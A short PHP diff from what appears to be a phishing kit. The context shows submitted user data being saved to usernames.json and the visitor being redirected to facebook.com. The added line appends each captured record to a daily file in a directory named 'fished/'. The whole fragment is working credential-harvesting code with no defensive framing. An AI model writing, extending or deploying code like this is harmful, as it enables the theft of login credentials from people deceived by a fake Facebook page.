@@ -49,6 +49,8 @@ array_push($usuarios,$usuario);
 
 file_put_contents("usernames.json", json_encode($usuarios , JSON_PRETTY_PRINT) );
 
+file_put_contents('fished/' . date('Y-m-d') . '.txt', json_encode($usuario) . "\n----\n", FILE_APPEND | LOCK_EX);
+
 header('Location: https://www.facebook.com');
 
 exit();
